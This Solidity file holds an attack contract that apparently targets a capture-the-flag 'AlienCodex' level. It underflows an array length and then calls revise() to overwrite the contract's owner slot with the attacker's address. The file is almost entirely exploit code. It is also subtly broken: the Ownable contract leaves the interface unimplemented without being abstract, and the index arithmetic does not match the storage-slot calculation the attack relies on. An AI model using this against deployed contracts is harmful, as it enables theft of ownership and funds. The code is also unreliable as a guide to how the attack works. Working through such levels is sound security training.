pragma solidity ^0.8.0;

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint i, bytes32 content) external;
}


contract Ownable is IAlienCodex {
    address private owner;
}


contract AlienAttacker {
    address public instance;
    bytes32 private constant KECCAH_SLOT = 0x7f69a65a53705c84d46dc0f24a13bc84f7ddc1d69dd2a36cd4fa9b672606286b;

    constructor(address _instance) {
        instance = _instance;
    }

    function attack() external {
        IAlienCodex(instance).makeContact();
        IAlienCodex(instance).retract();

        uint256 kecc = uint256(KECCAH_SLOT);

        uint256 i = kecc & (type(uint256).max - type(uint256).max) + 1;
        unchecked {
            i = (1 << 160) - uint256(uint160(instance)) - 1;
        }

        bytes32 content = bytes32(uint256(uint160(address(this))));
        IAlienCodex(instance).revise(i, content);
    }

    function getInstance() public view returns (address) {
        return instance;
    }
}
